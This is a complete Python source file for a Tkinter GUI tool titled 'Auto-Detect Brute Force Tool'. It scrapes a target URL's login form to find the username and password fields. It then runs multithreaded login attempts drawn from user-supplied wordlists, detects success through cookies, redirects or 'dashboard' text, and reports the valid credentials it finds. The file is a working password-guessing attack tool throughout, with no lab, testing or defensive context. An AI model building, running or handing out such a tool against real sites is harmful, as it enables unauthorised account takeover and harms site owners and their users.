import tkinter as tk
from tkinter import filedialog, messagebox
import threading
import requests
from lxml import html

found_creds = False
lock = threading.Lock()


# Read lines from file
def open_resources(file_path):
    try:
        return [item.strip() for item in open(file_path).readlines()]
    except Exception as e:
        print(f"[!] Error reading file {file_path}: {e}")
        return []


# Try login function
def try_login(session, url, user_field, password_field, user, password, output_text):
    global found_creds

    if found_creds:
        return

    payload = {
        user_field: user,
        password_field: password
    }

    try:
        response = session.post(url, data=payload, allow_redirects=True, timeout=10)

        # Success detection
        if (
            (response.history and any('logged_in_' in c for c in response.cookies.get_dict())) or
            ('logged_in_' in response.headers.get('Set-Cookie', '')) or
            ("dashboard" in response.text.lower())
        ):
            handle_success(user, password, output_text)
            return

        else:
            output_text.insert(tk.END, f"[-] Failed: {user} / {password}\n")
            output_text.see(tk.END)

    except requests.exceptions.RequestException as e:
        output_text.insert(tk.END, f"[!] Request error: {e}\n")
        output_text.see(tk.END)


# Handle successful login
def handle_success(user, password, output_text):
    global found_creds

    with lock:
        if found_creds:
            return

        output_text.insert(tk.END, f"\n[+] SUCCESS: Username: {user}, Password: {password}\n\n")
        output_text.see(tk.END)
        found_creds = True


# Extract form fields automatically
def extract_form_fields(url, output_text):
    output_text.insert(tk.END, f"[+] Fetching form fields from {url}\n")
    try:
        response = requests.get(url, timeout=10)
        tree = html.fromstring(response.text)

        forms = tree.xpath("//form")
        if not forms:
            output_text.insert(tk.END, "[!] No form found on page.\n")
            return None, None

        form = forms[0]
        inputs = form.xpath(".//input[@name and (@type='text' or @type='password')]")
        if len(inputs) < 2:
            output_text.insert(tk.END, "[!] Not enough input fields found.\n")
            return None, None

        user_field = None
        pass_field = None

        for inp in inputs:
            name = inp.xpath("@name")[0].strip()
            iptype = inp.xpath("@type")[0].strip()

            if iptype == "text" and not user_field:
                user_field = name
            elif iptype == "password" and not pass_field:
                pass_field = name

        if user_field and pass_field:
            output_text.insert(tk.END, f"[+] Detected fields: Username => '{user_field}', Password => '{pass_field}'\n")
            return user_field, pass_field
        else:
            output_text.insert(tk.END, "[!] Could not auto-detect both username and password fields.\n")
            return None, None

    except Exception as e:
        output_text.insert(tk.END, f"[!] Error extracting form fields: {e}\n")
        return None, None


# Start attack worker
def start_attack_worker(url, user_field, password_field, users_chunk, password_list, output_text):
    with requests.Session() as session:
        for user in users_chunk:
            for password in password_list:
                if found_creds:
                    return
                try_login(session, url, user_field, password_field, user, password, output_text)


# Main attack function
def start_attack(url, user_file, pass_file, num_threads, output_text):
    global found_creds
    found_creds = False

    output_text.insert(tk.END, f"\n[+] Connecting to: {url}\n\n")

    # Step 1: Auto-detect form fields
    user_field, pass_field = extract_form_fields(url, output_text)
    if not user_field or not pass_field:
        output_text.insert(tk.END, "[!] Couldn't auto-detect form fields. Exiting.\n")
        return

    # Step 2: Load wordlists
    users = open_resources(user_file)
    passwords = open_resources(pass_file)

    if not users or not passwords:
        output_text.insert(tk.END, "[!] Error loading wordlists.\n")
        return

    chunk_size = max(len(users) // num_threads, 1)
    threads = []

    for i in range(num_threads):
        start_index = i * chunk_size
        end_index = None if i + 1 == num_threads else start_index + chunk_size
        users_chunk = users[start_index:end_index]

        thread = threading.Thread(
            target=start_attack_worker,
            args=(url, user_field, pass_field, users_chunk, passwords, output_text)
        )
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    if found_creds:
        output_text.insert(tk.END, "[+] Attack completed. Valid credentials found.\n")
    else:
        output_text.insert(tk.END, "[-] Attack completed. No valid credentials found.\n")


# GUI Functions
def browse_file(entry):
    filename = filedialog.askopenfilename()
    entry.delete(0, tk.END)
    entry.insert(0, filename)


def run_attack():
    url = url_entry.get().strip()
    user_file = user_entry.get().strip()
    pass_file = pass_entry.get().strip()
    try:
        threads = int(threads_entry.get().strip())
    except ValueError:
        messagebox.showerror("Invalid Input", "Please enter a valid number of threads.")
        return

    if not all([url, user_file, pass_file]):
        messagebox.showerror("Missing Fields", "All fields are required.")
        return

    output_text.delete(1.0, tk.END)
    threading.Thread(target=start_attack, args=(url, user_file, pass_file, threads, output_text)).start()


# GUI Setup
root = tk.Tk()
root.title("Auto-Detect Brute Force Tool")
root.geometry("600x500")

# URL
tk.Label(root, text="Target URL:").pack(pady=5)
url_entry = tk.Entry(root, width=70)
url_entry.pack()

# Username File
tk.Label(root, text="Username List:").pack(pady=5)
user_frame = tk.Frame(root)
user_frame.pack()
user_entry = tk.Entry(user_frame, width=60)
user_entry.pack(side=tk.LEFT)
tk.Button(user_frame, text="Browse", command=lambda: browse_file(user_entry)).pack(side=tk.LEFT)

# Password File
tk.Label(root, text="Password List:").pack(pady=5)
pass_frame = tk.Frame(root)
pass_frame.pack()
pass_entry = tk.Entry(pass_frame, width=60)
pass_entry.pack(side=tk.LEFT)
tk.Button(pass_frame, text="Browse", command=lambda: browse_file(pass_entry)).pack(side=tk.LEFT)

# Threads
tk.Label(root, text="Number of Threads:").pack(pady=5)
threads_entry = tk.Entry(root, width=10)
threads_entry.pack()
threads_entry.insert(0, "5")

# Start Button
tk.Button(root, text="Start Attack", command=run_attack, bg="red", fg="white").pack(pady=10)

# Output Box
output_text = tk.Text(root, height=15, wrap="word")
output_text.pack(padx=10, pady=10, fill=tk.BOTH, expand=True)

root.mainloop()